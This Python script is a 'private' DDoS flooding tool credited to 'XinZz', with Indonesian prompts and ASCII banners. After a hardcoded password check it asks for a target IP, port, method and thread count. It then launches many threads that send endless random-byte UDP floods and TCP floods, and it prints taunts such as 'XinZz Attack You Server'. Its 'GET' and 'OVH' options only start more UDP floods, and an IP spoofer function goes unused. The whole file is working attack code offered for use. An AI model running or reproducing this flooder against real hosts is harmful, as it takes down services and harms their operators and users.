#tools By XinZz. 
#No Rename Bangst
import random
import socket
import threading
import time
import os,sys
import random, socket, threading
import os
import getpass

print("""
\033[0;32m _                         
\033[0;32m( )                _       
\033[0;32m| |      _     __ (_) ___  
\033[0;32m| |  _ / _ \ / _  \ |  _  \\
\033[0;32m| |_( ) (_) ) (_) | | ( ) |
\033[0;32m(____/ \___/ \__  |_)_) (_)
\033[0;32m            ( )_) |        
\033[0;32m             \___/         
""")

print("""
\033[0;32m _                         
\033[0;32m( )                _       
\033[0;32m| |      _     __ (_) ___  
\033[0;32m| |  _ / _ \ / _  \ |  _  \\
\033[0;32m| |_( ) (_) ) (_) | | ( ) |
\033[0;32m(____/ \___/ \__  |_)_) (_)
\033[0;32m            ( )_) |        
\033[0;32m             \___/         
""")

print("""
\033[0;32m _                         
\033[0;32m( )                _       
\033[0;32m| |      _     __ (_) ___  
\033[0;32m| |  _ / _ \ / _  \ |  _  \\
\033[0;32m| |_( ) (_) ) (_) | | ( ) |
\033[0;32m(____/ \___/ \__  |_)_) (_)
\033[0;32m            ( )_) |        
\033[0;32m             \___/         
""")

password ="boyz"

for i in range(4):
	pwd = input("[•] Password : ")
	j=3
	if(pwd==password):
		time.sleep(1)
		print("[•] ANALISIS PASWORD")
		break
	else:
		time.sleep(2)
		print("\033[91m[×] PASSWORD SALAH!!! ")
		continue
time.sleep(1)
print("KATASANDI KAMU BENAR!!!! \033[92m[√]\033[0m ")
time.sleep(2)
os.system("clear")


print("""/033[95m
  ██╗  ██╗██╗███╗   ██╗███████╗███████╗
╚██╗██╔╝██║████╗  ██║╚══███╔╝╚══███╔╝
   ╚███╔╝ ██║██╔██╗ ██║  ███╔╝   ███╔╝ 
   ██╔██╗ ██║██║╚██╗██║ ███╔╝   ███╔╝  
 ██╔╝ ██╗██║██║ ╚████║███████╗███████╗
╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝
  """)
  
print("\033[95m>> CODED : XinZz. ") 
print("\033[95m>>> Coded campuran by : XinTod22") 
print("\033[95m>>>> TOOLS PRIVATE XINZZ")
print("\033[91m                                       METODE: UDP-TCP-GET-OVH              ")
ip = str(input("  \033[0;31mIP:"))
port = int(input(" \033[0;32mPort:"))
choice = str(input(" \033[94mMethods: "))
times = int(input(" \033[0;31mPacket:"))
threads = int(input(" \033[0;32mThreads:"))
def run():
	data = random._urandom(577)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" XinZz. ")
		except:
			print("[!] ERROR SERVER TIME OUT")
			
def run2():
	data = random._urandom(818)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" XinZz. ")
		except:
			print("[!] ERROR SERVER TIME OUT")
			
def run3():
	data = random._urandom(818)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" XinZz. ")
		except:
			print("[!] ERROR SERVER TIME OUT")
			
def run4():
	data = random._urandom(17)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" XinZz Attack You Server")
		except:
			print("[!] ERROR SERVER TIME OUT")
			
def run5():
	data = random._urandom(1872637)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" XinZz. ")
		except:
			print("[!] ERROR SERVER TIME OUT")

def run6():
	data = random._urandom(146734)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" XinZz. ")
		except:
			print("[!] ERROR SERVER TIME OUT")

def run7():
    data = random._urandom(818)
    i = random.choice(("[•]","[•]","[•]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"XinZz ")
        except:
            s.close()
            print("DOWN KONTOL!!!")

def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assemebled

for y in range(threads):
	if choice == 'UDP':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
	if choice == 'udp':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
	if choice == 'TCP':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
	if choice == 'tcp':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
	if choice == 'GET':
		th = threading.Thread(target = run4)
		th.start()
		th = threading.Thread(target = run5)
		th.start()
	if choice == 'get':
		th = threading.Thread(target = run4)
		th.start()
		th = threading.Thread(target = run5)
		th.start()
	if choice == 'OVH':
		th = threading.Thread(target = run4)
		th.start()
		th = threading.Thread(target = run5)
		th.start()
	if choice == 'ovh':
		th = threading.Thread(target = run4)
		th.start()
		th = threading.Thread(target = run5)
		th.start()
else:
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
		th = threading.Thread(target = run4)
		th.start()
		th = threading.Thread(target = run5)
		th.start()
		th = threading.Thread(target = run6)
		th.start()
		th = threading.Thread(target = run7)